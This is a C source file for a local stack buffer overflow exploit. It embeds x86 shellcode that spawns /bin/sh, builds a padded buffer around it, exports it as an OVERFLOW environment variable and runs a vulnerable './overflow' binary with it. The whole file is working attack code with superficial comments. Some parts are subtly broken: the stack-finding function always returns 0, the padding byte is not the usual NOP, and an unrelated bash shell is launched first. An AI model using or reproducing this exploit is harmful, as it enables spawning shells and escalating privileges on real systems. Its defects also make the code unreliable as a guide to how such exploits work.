#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

// variables 
#define D_OFFSET 5000
#define DFS 300
#define NOTAR 0x80

// array 
// name of char = stack
char stack[]= "\x31\xc0" "\x50" "\x68""//sh" "\x68""/bin" "\x89\xe3" "\x50" "\x53" "\x89\xe1" "\x99" "\xb0\x0b" "\xcd\x80";

// Create a function 
// use name find_stack to get stack
unsigned long find_stack(void)
{

// move or display the data
__asm__("movl %esp,%eax");

// return 
return 0;

}
// main
// argc and argv argument
int main(int argc, char **argv)
{

// Declaring the variable
char *ptr;

// buffer array to store the buffer size
char buffer[DFS];

// Declaring the address
long address;

// Declaring that the pointer = buffer
ptr = buffer;

// stack pointer address
address = find_stack() - D_OFFSET;

// display address
printf("exploit 0x%lx\n", address);

// Copy the stack NOTAR using pointer
for (int i = 0; i <DFS/2; i++)

// assign the NOTAR
buffer[i] = NOTAR;

// move the shell code using pointer
ptr = buffer + ((DFS/2) - (strlen(stack)/2));

// loop start from o to access the length of code
for (int i = 0; i < strlen(stack); i++)
*(ptr++) = stack[i];

// exit with null
buffer[DFS - 1] = '\0';

// copy
memcpy(buffer,"OVERFLOW=",9);
printf("The buffer says .. [%s/%p].\n", buffer, &buffer);

// buffer
putenv(buffer);

//close
system("/bin/bash");

// sleep
sleep(1);

// overflow
system("./overflow $OVERFLOW");

// return
return 0;
}